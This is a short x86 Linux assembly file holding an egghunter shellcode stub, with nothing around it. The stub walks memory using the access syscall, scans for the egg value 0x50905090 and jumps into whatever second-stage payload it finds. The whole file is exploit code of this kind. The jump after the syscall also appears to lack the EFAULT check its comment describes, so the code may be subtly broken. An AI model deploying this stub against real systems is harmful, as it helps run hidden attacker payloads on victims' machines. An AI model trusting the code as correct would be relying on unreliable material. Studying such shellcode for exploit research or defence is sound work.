global _start
section .text
_start:	
    xor edx, edx
    mov ecx, edx
    mul edx
set_page:
    or dx,0xfff		    ; initial page size = 4095
page_size:
    inc edx		    ; increase page size to 4096 to remove nulls
    lea ebx,[edx + 0x4]     ; load page into ebx
    mov al, 0x21            ; sys access
    int 0x80
    jz set_page             ; if zflag = 0 (EFAULT is returned), we need to skip this block
    mov eax, 0x50905090     ; mov egg string into eax
    mov edi, edx            ; mov page into edi
    scasd                   ; scan string stored in edi, with eax
    jnz page_size           ; if string is not found scan again
    scasd
    jnz page_size           ; if string is not found scan again
    jmp edi                 ; execute the second stage
    
